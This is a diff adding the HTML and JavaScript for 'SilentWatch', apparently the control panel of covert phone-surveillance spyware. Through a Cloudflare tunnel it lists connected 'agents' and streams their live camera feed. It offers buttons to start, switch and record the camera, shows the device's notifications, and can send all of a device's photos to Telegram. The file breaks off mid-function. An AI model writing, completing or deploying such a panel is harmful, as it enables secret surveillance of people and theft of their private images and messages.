@@ -1,0 +1,973 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>SilentWatch — Control Panel</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+
+:root{
+  --bg:#05080f;
+  --bg2:#080d17;
+  --surface:#0b1120;
+  --card:#0f1826;
+  --card2:#121e30;
+  --border:#1a2640;
+  --border2:#1e2e48;
+  --accent:#00e5ff;
+  --accent2:#00b4d8;
+  --accent-dim:rgba(0,229,255,.1);
+  --accent-glow:rgba(0,229,255,.25);
+  --green:#00e676;
+  --green-dim:rgba(0,230,118,.1);
+  --danger:#ff4757;
+  --danger-dim:rgba(255,71,87,.1);
+  --warn:#ffa502;
+  --warn-dim:rgba(255,165,2,.1);
+  --purple:#a855f7;
+  --purple-dim:rgba(168,85,247,.1);
+  --blue:#3b82f6;
+  --blue-dim:rgba(59,130,246,.1);
+  --text:#e2e8f0;
+  --text2:#94a3b8;
+  --muted:#475569;
+  --font:'Inter',sans-serif;
+  --mono:'JetBrains Mono',monospace;
+}
+
+html,body{height:100%;overflow:hidden}
+body{background:var(--bg);color:var(--text);font-family:var(--font);display:flex;flex-direction:column}
+
+/* ── Scrollbars ── */
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:4px}
+::-webkit-scrollbar-thumb:hover{background:var(--muted)}
+
+/* ── Grid background ── */
+body::before{
+  content:'';position:fixed;inset:0;z-index:0;
+  background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+  background-size:40px 40px;
+  opacity:.25;pointer-events:none;
+}
+
+/* ── Header ── */
+header{
+  position:relative;z-index:10;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 24px;height:58px;
+  background:rgba(8,13,23,.9);
+  border-bottom:1px solid var(--border2);
+  backdrop-filter:blur(16px);
+  flex-shrink:0;
+}
+
+.logo{display:flex;align-items:center;gap:12px}
+.logo-icon{
+  width:32px;height:32px;border-radius:8px;
+  background:linear-gradient(135deg,var(--accent),var(--blue));
+  display:grid;place-items:center;
+  box-shadow:0 0 20px var(--accent-glow);
+  animation:logo-pulse 3s ease-in-out infinite;
+}
+@keyframes logo-pulse{0%,100%{box-shadow:0 0 20px var(--accent-glow)}50%{box-shadow:0 0 35px rgba(0,229,255,.4)}}
+.logo-icon svg{width:16px;height:16px;color:#000}
+.logo-text{font-size:.85rem;font-weight:800;letter-spacing:.18em;color:#fff}
+.logo-sub{font-size:.6rem;color:var(--accent);letter-spacing:.12em;font-weight:500;margin-top:-2px}
+
+.header-right{display:flex;align-items:center;gap:10px}
+
+.pill{
+  display:flex;align-items:center;gap:7px;
+  padding:6px 14px;border-radius:50px;
+  font-size:.68rem;font-weight:600;letter-spacing:.08em;
+  border:1px solid var(--border2);
+  background:rgba(15,24,38,.7);
+  transition:all .3s;
+}
+.pill-dot{width:6px;height:6px;border-radius:50%;background:var(--muted);transition:all .3s;flex-shrink:0}
+.pill.on .pill-dot{background:var(--green);box-shadow:0 0 8px var(--green)}
+.pill.on{border-color:rgba(0,230,118,.25);color:var(--green)}
+.pill.live .pill-dot{background:var(--danger);box-shadow:0 0 8px var(--danger);animation:blink 1s infinite}
+.pill.live{border-color:rgba(255,71,87,.25);color:var(--danger)}
+.pill.cloud{border-color:rgba(0,229,255,.2);color:var(--accent)}
+.pill.cloud .pill-dot{background:var(--accent);box-shadow:0 0 6px var(--accent)}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+
+/* ── Layout ── */
+main{flex:1;display:grid;grid-template-columns:1fr 320px;overflow:hidden;position:relative;z-index:1}
+
+/* ── Feed Panel ── */
+.feed{
+  background:#000;position:relative;
+  display:flex;align-items:center;justify-content:center;
+  overflow:hidden;
+}
+.feed::before{
+  content:'';position:absolute;inset:0;
+  background:radial-gradient(ellipse at center,rgba(0,229,255,.03) 0%,transparent 70%);
+  pointer-events:none;z-index:1;
+}
+
+#video-feed{width:100%;height:100%;object-fit:contain;display:none;position:relative;z-index:2}
+
+.placeholder{
+  display:flex;flex-direction:column;align-items:center;gap:20px;
+  opacity:.18;user-select:none;z-index:2;
+}
+.placeholder-icon{
+  width:80px;height:80px;border-radius:50%;
+  border:2px solid currentColor;
+  display:grid;place-items:center;
+  animation:spin-slow 8s linear infinite;
+}
+@keyframes spin-slow{to{transform:rotate(360deg)}}
+.placeholder-icon svg{width:36px;height:36px}
+.placeholder p{font-size:.75rem;font-weight:600;letter-spacing:.2em;text-transform:uppercase}
+
+/* Corner brackets when live */
+.corners{position:absolute;inset:0;pointer-events:none;z-index:3}
+.corner{position:absolute;width:24px;height:24px;border-color:var(--accent);border-style:solid;opacity:0;transition:opacity .4s}
+.corner.tl{top:20px;left:20px;border-width:2px 0 0 2px;border-radius:2px 0 0 0}
+.corner.tr{top:20px;right:20px;border-width:2px 2px 0 0;border-radius:0 2px 0 0}
+.corner.bl{bottom:20px;left:20px;border-width:0 0 2px 2px;border-radius:0 0 0 2px}
+.corner.br{bottom:20px;right:20px;border-width:0 2px 2px 0;border-radius:0 0 2px 0}
+.feed.live .corner{opacity:1}
+
+.live-badge{
+  position:absolute;top:20px;left:50%;transform:translateX(-50%);
+  display:none;align-items:center;gap:7px;
+  background:var(--danger);color:#fff;
+  font-size:.62rem;font-weight:800;letter-spacing:.2em;
+  padding:5px 14px;border-radius:6px;z-index:4;
+}
+.live-dot{width:5px;height:5px;border-radius:50%;background:#fff;animation:blink 1s infinite}
+.feed.live .live-badge{display:flex}
+
+.feed-hud{
+  position:absolute;bottom:0;left:0;right:0;
+  padding:12px 20px;
+  background:linear-gradient(transparent,rgba(0,0,0,.7));
+  display:flex;justify-content:space-between;align-items:flex-end;
+  z-index:4;pointer-events:none;
+  opacity:0;transition:opacity .3s;
+}
+.feed.live .feed-hud{opacity:1}
+.hud-item{font-size:.62rem;color:rgba(255,255,255,.6);letter-spacing:.08em;font-family:var(--mono)}
+.hud-item span{color:var(--accent);font-weight:500}
+
+.watching-tag{
+  position:absolute;top:20px;right:20px;z-index:4;
+  background:rgba(0,0,0,.7);border:1px solid var(--accent);
+  color:var(--accent);font-size:.58rem;font-weight:700;
+  letter-spacing:.14em;padding:4px 10px;border-radius:4px;
+  display:none;text-transform:uppercase;
+}
+.feed.live .watching-tag{display:block}
+
+/* ── Sidebar ── */
+.sidebar{
+  border-left:1px solid var(--border2);
+  background:rgba(8,13,23,.95);
+  display:flex;flex-direction:column;
+  overflow:hidden;
+  backdrop-filter:blur(8px);
+}
+
+/* ── Tabs ── */
+.tabs{
+  display:flex;border-bottom:1px solid var(--border2);
+  background:rgba(11,17,32,.8);
+  flex-shrink:0;
+}
+.tab{
+  flex:1;padding:14px 8px;
+  font-size:.65rem;font-weight:700;letter-spacing:.12em;
+  color:var(--muted);text-transform:uppercase;text-align:center;
+  cursor:pointer;border-bottom:2px solid transparent;
+  transition:all .2s;position:relative;
+}
+.tab:hover{color:var(--text2)}
+.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
+.tab-badge{
+  position:absolute;top:8px;right:calc(50% - 20px);
+  background:var(--danger);color:#fff;
+  font-size:.5rem;font-weight:800;
+  width:16px;height:16px;border-radius:50%;
+  display:none;place-items:center;
+}
+.tab-badge.show{display:grid}
+
+.tab-pane{display:none;flex:1;flex-direction:column;overflow:hidden}
+.tab-pane.active{display:flex}
+
+/* ── Panel ── */
+.panel{padding:16px 18px;border-bottom:1px solid var(--border)}
+.panel:last-child{border-bottom:none}
+.panel-title{
+  font-size:.6rem;font-weight:700;letter-spacing:.18em;
+  color:var(--muted);text-transform:uppercase;margin-bottom:14px;
+  display:flex;align-items:center;gap:8px;
+}
+.panel-title::before{
+  content:'';width:3px;height:12px;
+  background:var(--accent);border-radius:2px;
+  box-shadow:0 0 8px var(--accent);
+}
+
+/* ── Tunnel Banner ── */
+.tunnel-card{
+  background:var(--card);border:1px solid var(--border2);
+  border-radius:10px;padding:12px 14px;
+  display:flex;align-items:center;gap:12px;
+  transition:all .3s;margin-bottom:10px;
+}
+.tunnel-card.active{border-color:rgba(0,229,255,.3);background:rgba(0,229,255,.05)}
+.tunnel-card.connecting{border-color:rgba(59,130,246,.3);background:rgba(59,130,246,.05)}
+.tunnel-pulse{
+  width:10px;height:10px;border-radius:50%;
+  background:var(--muted);flex-shrink:0;
+  transition:all .3s;
+}
+.tunnel-pulse.active{background:var(--accent);box-shadow:0 0 10px var(--accent);animation:logo-pulse 2s infinite}
+.tunnel-pulse.connecting{background:var(--blue);box-shadow:0 0 10px var(--blue);animation:blink .8s infinite}
+.tunnel-info{flex:1;min-width:0}
+.tunnel-label{font-size:.7rem;font-weight:600;color:var(--text2);margin-bottom:2px}
+.tunnel-url{font-size:.6rem;color:var(--muted);font-family:var(--mono);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tunnel-url.live{color:var(--accent)}
+.tunnel-icon{font-size:1.1rem}
+
+.manual-toggle{
+  font-size:.65rem;color:var(--muted);cursor:pointer;
+  text-align:center;padding:6px;text-decoration:underline;
+  text-underline-offset:3px;transition:color .2s;
+}
+.manual-toggle:hover{color:var(--text2)}
+
+.manual-section{display:none;margin-top:10px}
+.field{display:flex;flex-direction:column;gap:5px;margin-bottom:10px}
+.field label{font-size:.68rem;color:var(--muted);font-weight:500}
+.field input{
+  background:var(--bg2);border:1px solid var(--border2);
+  color:var(--text);font-family:var(--mono);font-size:.72rem;
+  padding:9px 12px;border-radius:8px;outline:none;width:100%;
+  transition:all .2s;
+}
+.field input:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-dim)}
+
+/* ── Agent Cards ── */
+.agent-list{display:flex;flex-direction:column;gap:6px}
+.agent-card{
+  display:flex;align-items:center;gap:10px;
+  padding:10px 12px;background:var(--card);
+  border:1px solid var(--border2);border-radius:10px;
+  cursor:pointer;transition:all .2s;font-size:.78rem;
+}
+.agent-card:hover{border-color:var(--accent);transform:translateX(2px)}
+.agent-card.sel{
+  border-color:var(--accent);background:rgba(0,229,255,.05);
+  box-shadow:0 0 0 1px var(--accent),inset 0 0 20px rgba(0,229,255,.05);
+}
+.agent-pip{
+  width:8px;height:8px;border-radius:50%;
+  background:var(--green);box-shadow:0 0 6px var(--green);
+  flex-shrink:0;animation:blink 2s ease-in-out infinite;
+}
+.agent-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-weight:500}
+.agent-eye{font-size:.7rem;color:var(--muted)}
+.agent-card.sel .agent-eye{color:var(--accent)}
+.no-agents{font-size:.72rem;color:var(--muted);text-align:center;padding:16px 0;opacity:.7}
+
+/* ── Buttons ── */
+.btn{
+  width:100%;padding:10px 14px;border-radius:9px;
+  font-family:var(--font);font-size:.78rem;font-weight:600;
+  cursor:pointer;transition:all .18s;border:1px solid transparent;
+  letter-spacing:.03em;display:flex;align-items:center;justify-content:center;gap:7px;
+}
+.btn+.btn{margin-top:7px}
+.btn:disabled{opacity:.3;cursor:not-allowed;transform:none!important}
+
+.btn-primary{background:var(--accent);color:#000;border-color:var(--accent)}
+.btn-primary:not(:disabled):hover{background:#00ffff;box-shadow:0 0 24px var(--accent-glow)}
+
+.btn-danger{background:var(--danger-dim);color:var(--danger);border-color:rgba(255,71,87,.25)}
+.btn-danger:not(:disabled):hover{background:rgba(255,71,87,.18);box-shadow:0 0 14px rgba(255,71,87,.2)}
+
+.btn-ghost{background:transparent;color:var(--danger);border-color:rgba(255,71,87,.3)}
+.btn-ghost:not(:disabled):hover{background:var(--danger-dim)}
+
+.btn-green{background:var(--green-dim);color:var(--green);border-color:rgba(0,230,118,.25)}
+.btn-green:not(:disabled):hover{background:rgba(0,230,118,.18);box-shadow:0 0 14px rgba(0,230,118,.2)}
+
+.btn-blue{background:var(--blue-dim);color:var(--blue);border-color:rgba(59,130,246,.25)}
+.btn-blue:not(:disabled):hover{background:rgba(59,130,246,.18);box-shadow:0 0 14px rgba(59,130,246,.2)}
+
+.btn-purple{background:var(--purple-dim);color:var(--purple);border-color:rgba(168,85,247,.25)}
+.btn-purple:not(:disabled):hover{background:rgba(168,85,247,.2);box-shadow:0 0 16px rgba(168,85,247,.25)}
+.btn-purple.sending{animation:purple-pulse .7s ease-in-out 2}
+@keyframes purple-pulse{0%,100%{box-shadow:none}50%{box-shadow:0 0 24px rgba(168,85,247,.5)}}
+
+.btn-warn{background:var(--warn-dim);color:var(--warn);border-color:rgba(255,165,2,.25)}
+.btn-warn:not(:disabled):hover{background:rgba(255,165,2,.18)}
+.btn-warn.on{background:rgba(255,165,2,.25);box-shadow:0 0 12px rgba(255,165,2,.2)}
+
+.btn-red{background:rgba(239,68,68,.1);color:#ef4444;border-color:rgba(239,68,68,.25)}
+.btn-red:not(:disabled):hover{background:rgba(239,68,68,.18)}
+
+/* ── Grid buttons ── */
+.btn-grid{display:grid;gap:7px}
+.btn-grid-2{grid-template-columns:1fr 1fr}
+
+/* ── Stats ── */
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:6px}
+.stat{
+  background:var(--card);border:1px solid var(--border2);
+  border-radius:8px;padding:10px 6px;text-align:center;
+}
+.stat-val{
+  font-size:1rem;font-weight:800;color:var(--accent);
+  font-family:var(--mono);display:block;
+}
+.stat-label{font-size:.52rem;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;margin-top:2px}
+
+/* ── Log ── */
+.log-scroll{flex:1;overflow-y:auto;padding:10px 14px;display:flex;flex-direction:column;gap:2px;min-height:0}
+.log-entry{
+  font-size:.64rem;font-family:var(--mono);line-height:1.6;
+  padding:2px 8px;border-left:2px solid transparent;color:var(--muted);
+  border-radius:0 4px 4px 0;
+}
+.log-entry.i{border-color:var(--blue);color:var(--text2);background:rgba(59,130,246,.04)}
+.log-entry.s{border-color:var(--green);color:var(--green);background:rgba(0,230,118,.04)}
+.log-entry.e{border-color:var(--danger);color:var(--danger);background:rgba(255,71,87,.04)}
+.log-entry.w{border-color:var(--warn);color:var(--warn);background:rgba(255,165,2,.04)}
+.log-ts{color:var(--muted);margin-right:8px;opacity:.6}
+
+/* ── Gallery status ── */
+.gallery-status{
+  margin-top:8px;padding:8px 12px;border-radius:8px;
+  font-size:.68rem;text-align:center;display:none;
+  background:rgba(168,85,247,.08);border:1px solid rgba(168,85,247,.2);
+  color:var(--purple);
+}
+
+/* ── Notifications ── */
+.notif-scroll{flex:1;overflow-y:auto;padding:14px;display:flex;flex-direction:column;gap:8px;min-height:0}
+.notif-card{
+  background:var(--card);border:1px solid var(--border2);
+  border-radius:12px;padding:12px 14px;
+  animation:slide-up .3s ease-out;transition:transform .2s,border-color .2s;
+}
+.notif-card:hover{transform:translateY(-2px);border-color:var(--accent)}
+@keyframes slide-up{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+.notif-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
+.notif-app{font-size:.62rem;font-weight:700;color:var(--accent);text-transform:uppercase;letter-spacing:.08em}
+.notif-time{font-size:.58rem;color:var(--muted)}
+.notif-title{font-size:.78rem;font-weight:600;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:3px}
+.notif-body{font-size:.7rem;color:var(--text2);line-height:1.4;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.notif-img{width:100%;height:110px;object-fit:cover;border-radius:7px;margin-top:8px;border:1px solid var(--border2);cursor:pointer}
+.no-notifs{text-align:center;padding:40px 0;color:var(--muted);font-size:.72rem;opacity:.6}
+
+/* ── Toast ── */
+#toast-wrap{position:fixed;bottom:20px;left:20px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none}
+.toast{
+  background:rgba(11,17,32,.95);border:1px solid var(--border2);
+  border-left:4px solid var(--accent);border-radius:10px;
+  padding:12px 16px;max-width:380px;backdrop-filter:blur(16px);
+  box-shadow:0 8px 32px rgba(0,0,0,.5);
+  animation:toast-in .4s cubic-bezier(.18,.89,.32,1.28);
+}
+@keyframes toast-in{from{opacity:0;transform:translateX(-24px)}to{opacity:1;transform:translateX(0)}}
+.toast-app{font-size:.6rem;color:var(--accent);font-weight:800;letter-spacing:.1em;text-transform:uppercase;margin-bottom:4px}
+.toast-body{font-size:.78rem;font-weight:500;color:var(--text)}
+
+/* ── Responsive ── */
+@media(max-width:680px){
+  main{grid-template-columns:1fr;grid-template-rows:50vw 1fr}
+  .sidebar{border-left:none;border-top:1px solid var(--border2)}
+}
+</style>
+</head>
+<body>
+
+<div id="toast-wrap"></div>
+
+<!-- ── Header ── -->
+<header>
+  <div class="logo">
+    <div class="logo-icon">
+      <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 2a5 5 0 110 10A5 5 0 018 3zm0 2a3 3 0 100 6 3 3 0 000-6z"/></svg>
+    </div>
+    <div>
+      <div class="logo-text">SILENTWATCH</div>
+      <div class="logo-sub">CONTROL PANEL</div>
+    </div>
+  </div>
+  <div class="header-right">
+    <div class="pill cloud" id="pill-tunnel">
+      <div class="pill-dot"></div>
+      <span id="pill-tunnel-txt">CLOUD TUNNEL</span>
+    </div>
+    <div class="pill" id="pill-srv">
+      <div class="pill-dot"></div>
+      <span id="pill-srv-txt">OFFLINE</span>
+    </div>
+    <div class="pill" id="pill-agent">
+      <div class="pill-dot"></div>
+      <span id="pill-agent-txt">NO AGENT</span>
+    </div>
+  </div>
+</header>
+
+<!-- ── Main ── -->
+<main>
+
+  <!-- ── Live Feed ── -->
+  <div class="feed" id="feed-area">
+    <img id="video-feed" alt="Live Feed"/>
+    <div class="placeholder" id="placeholder">
+      <div class="placeholder-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+          <path d="M15 10l4.553-2.069A1 1 0 0121 8.87v6.26a1 1 0 01-1.447.894L15 14M3 8a2 2 0 012-2h10a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z"/>
+        </svg>
+      </div>
+      <p id="placeholder-txt">Awaiting Connection</p>
+    </div>
+    <div class="corners">
+      <div class="corner tl"></div><div class="corner tr"></div>
+      <div class="corner bl"></div><div class="corner br"></div>
+    </div>
+    <div class="live-badge"><div class="live-dot"></div>LIVE</div>
+    <div class="watching-tag" id="watching-tag">—</div>
+    <div class="feed-hud">
+      <div class="hud-item" id="hud-ts">—</div>
+      <div class="hud-item" id="hud-fps">— <span>FPS</span></div>
+      <div class="hud-item" id="hud-frame">FRAME <span id="hud-frame-num">0</span></div>
+      <div class="hud-item" id="hud-kb">— <span>KB</span></div>
+    </div>
+  </div>
+
+  <!-- ── Sidebar ── -->
+  <div class="sidebar">
+
+    <!-- Tabs -->
+    <div class="tabs">
+      <div class="tab active" id="tab-ctrl-btn" onclick="openTab('ctrl')">Controls</div>
+      <div class="tab" id="tab-notif-btn" onclick="openTab('notif')">
+        Notifications
+        <div class="tab-badge" id="notif-badge">0</div>
+      </div>
+      <div class="tab" id="tab-log-btn" onclick="openTab('log')">Log</div>
+    </div>
+
+    <!-- ── Controls Tab ── -->
+    <div class="tab-pane active" id="pane-ctrl" style="overflow-y:auto">
+
+      <!-- Cloud Tunnel -->
+      <div class="panel">
+        <div class="panel-title">Cloud Tunnel</div>
+        <div class="tunnel-card" id="tunnel-card">
+          <div class="tunnel-pulse" id="tunnel-pulse"></div>
+          <div class="tunnel-info">
+            <div class="tunnel-label" id="tunnel-label">Waiting for tunnel…</div>
+            <div class="tunnel-url" id="tunnel-url">Run: python start_tunnel.py</div>
+          </div>
+          <div class="tunnel-icon">☁️</div>
+        </div>
+        <div class="manual-toggle" onclick="toggleManual()" id="manual-toggle">⚙ Enter URL manually</div>
+        <div class="manual-section" id="manual-section">
+          <div class="field" style="margin-top:10px">
+            <label>WebSocket URL</label>
+            <input id="url-input" type="text" placeholder="wss://xxx.trycloudflare.com"/>
+          </div>
+          <button class="btn btn-primary" id="btn-connect" onclick="toggleConnect()">Connect</button>
+          <button class="btn btn-ghost" id="btn-disconnect" onclick="disconnect()" style="display:none">Disconnect</button>
+        </div>
+      </div>
+
+      <!-- Agents -->
+      <div class="panel">
+        <div class="panel-title">Active Agents</div>
+        <div class="agent-list" id="agent-list">
+          <p class="no-agents">No agents connected</p>
+        </div>
+      </div>
+
+      <!-- Camera -->
+      <div class="panel">
+        <div class="panel-title">Camera Control</div>
+        <div class="btn-grid btn-grid-2" style="margin-bottom:7px">
+          <button class="btn btn-green" id="btn-start" onclick="sendCmd('start_camera')" disabled>▶ Start</button>
+          <button class="btn btn-danger" id="btn-stop" onclick="sendCmd('stop_camera')" disabled>■ Stop</button>
+        </div>
+        <button class="btn btn-blue" id="btn-switch" onclick="switchCam()" disabled style="margin-bottom:7px">⇄ Switch Camera (Front)</button>
+        <button class="btn btn-warn" id="btn-low" onclick="toggleLowNet()" disabled>⚡ Low Internet Mode: OFF</button>
+      </div>
+
+      <!-- Recording -->
+      <div class="panel">
+        <div class="panel-title">Recording</div>
+        <div class="btn-grid btn-grid-2">
+          <button class="btn btn-red" id="btn-rec-start" onclick="sendCmd('start_recording')" disabled>🔴 Record</button>
+          <button class="btn btn-danger" id="btn-rec-stop" onclick="sendCmd('stop_recording')" disabled>■ Stop</button>
+        </div>
+      </div>
+
+      <!-- Gallery -->
+      <div class="panel">
+        <div class="panel-title">Gallery &amp; Data</div>
+        <button class="btn btn-purple" id="btn-gallery" onclick="fetchGallery()" disabled>
+          🖼 Fetch All Photos → Telegram
+        </button>
+        <div class="gallery-status" id="gallery-status">Sending request to device…</div>
+      </div>
+
+      <!-- Stats -->
+      <div class="panel">
+        <div class="panel-title">Stream Stats</div>
+        <div class="stats-grid">
+          <div class="stat"><span class="stat-val" id="s-fps">—</span><span class="stat-label">FPS</span></div>
+          <div class="stat"><span class="stat-val" id="s-frames">0</span><span class="stat-label">Frames</span></div>
+          <div class="stat"><span class="stat-val" id="s-kb">—</span><span class="stat-label">KB/f</span></div>
+          <div class="stat"><span class="stat-val" id="s-agents">0</span><span class="stat-label">Agents</span></div>
+        </div>
+      </div>
+
+    </div><!-- /pane-ctrl -->
+
+    <!-- ── Notifications Tab ── -->
+    <div class="tab-pane" id="pane-notif">
+      <div class="notif-scroll" id="notif-feed">
+        <p class="no-notifs">No notifications yet</p>
+      </div>
+    </div>
+
+    <!-- ── Log Tab ── -->
+    <div class="tab-pane" id="pane-log">
+      <div class="log-scroll" id="log-feed"></div>
+    </div>
+
+  </div><!-- /sidebar -->
+</main>
+
+<script>
+// ── State ──────────────────────────────────────────────────────────────────────
+let ws = null, selectedAgent = null;
+let frames = 0, fpsCount = 0, lastFps = Date.now();
+let pendingFrame = null, rafScheduled = false;
+let clockTick = null, heartbeatTick = null;
+let reconnectTimer = null, reconnectDelay = 1000, manualClose = false;
+let lowNetOn = false, camFacing = 'Front';
+let notifCount = 0, manualVisible = false;
+
+// ── Tab system ────────────────────────────────────────────────────────────────
+function openTab(name) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+  document.getElementById('tab-' + name + '-btn').classList.add('active');
+  document.getElementById('pane-' + name).classList.add('active');
+  if (name === 'notif') {
+    notifCount = 0;
+    const b = document.getElementById('notif-badge');
+    b.textContent = '0'; b.classList.remove('show');
+  }
+}
+
+// ── Tunnel banner ──────────────────────────────────────────────────────────────
+function setTunnelWaiting() {
+  const card = document.getElementById('tunnel-card');
+  const pulse = document.getElementById('tunnel-pulse');
+  card.className = 'tunnel-card';
+  pulse.className = 'tunnel-pulse';
+  document.getElementById('tunnel-label').textContent = 'Waiting for tunnel…';
+  const urlEl = document.getElementById('tunnel-url');
+  urlEl.textContent = 'Run: python start_tunnel.py';
+  urlEl.className = 'tunnel-url';
+  document.getElementById('pill-tunnel').className = 'pill cloud';
+}
+function setTunnelConnecting(url) {
+  const card = document.getElementById('tunnel-card');
+  const pulse = document.getElementById('tunnel-pulse');
+  card.className = 'tunnel-card connecting';
+  pulse.className = 'tunnel-pulse connecting';
+  document.getElementById('tunnel-label').textContent = 'Connecting…';
+  const urlEl = document.getElementById('tunnel-url');
+  urlEl.textContent = url;
+  urlEl.className = 'tunnel-url';
+}
+function setTunnelActive(url) {
+  const card = document.getElementById('tunnel-card');
+  const pulse = document.getElementById('tunnel-pulse');
+  card.className = 'tunnel-card active';
+  pulse.className = 'tunnel-pulse active';
+  document.getElementById('tunnel-label').textContent = 'Tunnel Active';
+  const urlEl = document.getElementById('tunnel-url');
+  urlEl.textContent = url;
+  urlEl.className = 'tunnel-url live';
+  document.getElementById('pill-tunnel').className = 'pill cloud on';
+}
+function toggleManual() {
+  manualVisible = !manualVisible;
+  document.getElementById('manual-section').style.display = manualVisible ? 'block' : 'none';
+  document.getElementById('manual-toggle').textContent = manualVisible ? '✕ Hide manual URL' : '⚙ Enter URL manually';
+}
+
+// ── Status pills ───────────────────────────────────────────────────────────────
+function setServer(on) {
+  const p = document.getElementById('pill-srv');
+  p.className = 'pill' + (on ? ' on' : '');
+  document.getElementById('pill-srv-txt').textContent = on ? 'ONLINE' : 'OFFLINE';
+}
+function setAgentPill(on) {
+  const p = document.getElementById('pill-agent');
+  p.className = 'pill' + (on ? ' live' : '');
+  document.getElementById('pill-agent-txt').textContent = on ? 'AGENT LIVE' : 'NO AGENT';
+}
+function setLive(on) {
+  const fa = document.getElementById('feed-area');
+  const img = document.getElementById('video-feed');
+  const ph = document.getElementById('placeholder');
+  fa.classList.toggle('live', on);
+  img.style.display = on ? 'block' : 'none';
+  ph.style.display = on ? 'none' : 'flex';
+}
+function setControls(on) {
+  ['btn-start','btn-stop','btn-switch','btn-low','btn-rec-start','btn-rec-stop','btn-gallery'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.disabled = !on;
+  });
+}
+
+// ── Log ───────────────────────────────────────────────────────────────────────
+function log(msg, type = 'i') {
+  const el = document.getElementById('log-feed');
+  if (!el) return;
+  const ts = new Date().toTimeString().slice(0, 8);
+  const d = document.createElement('div');
+  d.className = `log-entry ${type}`;
+  d.innerHTML = `<span class="log-ts">${ts}</span>${msg}`;
+  el.appendChild(d);
+  el.scrollTop = el.scrollHeight;
+  while (el.children.length > 300) el.removeChild(el.firstChild);
+}
+
+// ── Agents ────────────────────────────────────────────────────────────────────
+function updateAgents(list) {
+  document.getElementById('s-agents').textContent = list.length;
+  const el = document.getElementById('agent-list');
+  if (!list.length) {
+    el.innerHTML = '<p class="no-agents">No agents connected</p>';
+    setControls(false); setAgentPill(false); return;
+  }
+  el.innerHTML = list.map(a => `
+    <div class="agent-card${selectedAgent === a.agent_id ? ' sel' : ''}" id="ac-${a.agent_id}" onclick="selectAgent('${a.agent_id}')">
+      <div class="agent-pip"></div>
+      <span class="agent-name">${a.agent_id}</span>
+      <span class="agent-eye">${selectedAgent === a.agent_id ? '👁' : ''}</span>
+    </div>`).join('');
+  if (!selectedAgent || !list.find(a => a.agent_id === selectedAgent)) {
+    selectAgent(list[0].agent_id);
+  }
+}
+
+function selectAgent(id) {
+  if (selectedAgent === id) return;
+  selectedAgent = id;
+  if (pendingFrame) { URL.revokeObjectURL(pendingFrame); pendingFrame = null; }
+  rafScheduled = false;
+  setLive(false); frames = 0; fpsCount = 0;
+  document.getElementById('s-frames').textContent = '0';
+  document.getElementById('s-fps').textContent = '—';
+  document.getElementById('hud-frame-num').textContent = '0';
+  setControls(true); setAgentPill(false);
+  document.getElementById('watching-tag').textContent = id;
+  document.querySelectorAll('.agent-card').forEach(c => {
+    const cid = c.id.replace('ac-', '');
+    c.classList.toggle('sel', cid === id);
+    c.querySelector('.agent-eye').textContent = cid === id ? '👁' : '';
+  });
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify({ command: 'watch_agent', agent_id: id }));
+  }
+  log(`👁 Watching: ${id}`, 's');
+}
+
+// ── Frame render ──────────────────────────────────────────────────────────────
+function renderFrame() {
+  rafScheduled = false;
+  if (!pendingFrame) return;
+  const img = document.getElementById('video-feed');
+  const prev = img.src;
+  img.onload = () => { if (prev && prev.startsWith('blob:')) URL.revokeObjectURL(prev); };
+  img.src = pendingFrame;
+  pendingFrame = null;
+}
+
+function tickFPS() {
+  fpsCount++;
+  const now = Date.now();
+  if (now - lastFps >= 1000) {
+    const fps = (fpsCount / ((now - lastFps) / 1000)).toFixed(1);
+    document.getElementById('s-fps').textContent = fps;
+    document.getElementById('hud-fps').innerHTML = fps + ' <span>FPS</span>';
+    fpsCount = 0; lastFps = now;
+  }
+}
+
+// ── Commands ──────────────────────────────────────────────────────────────────
+function sendCmd(cmd) {
+  if (!ws || ws.readyState !== WebSocket.OPEN || !selectedAgent) return;
+  ws.send(JSON.stringify({ command: cmd, agent_id: selectedAgent }));
+  log(`→ ${cmd} → ${selectedAgent}`);
+}
+
+function switchCam() {
+  sendCmd('switch_camera');
+  camFacing = camFacing === 'Front' ? 'Back' : 'Front';
+  document.getElementById('btn-switch').innerHTML = `⇄ Switch Camera (${camFacing})`;
+  log(`⇄ Switched to ${camFacing} camera`);
+}
+
+function toggleLowNet() {
+  lowNetOn = !lowNetOn;
+  const btn = document.getElementById('btn-low');
+  sendCmd(lowNetOn ? 'low_internet_on' : 'low_internet_off');
+  btn.textContent = `⚡ Low Internet Mode: ${lowNetOn ? 'ON' : 'OFF'}`;
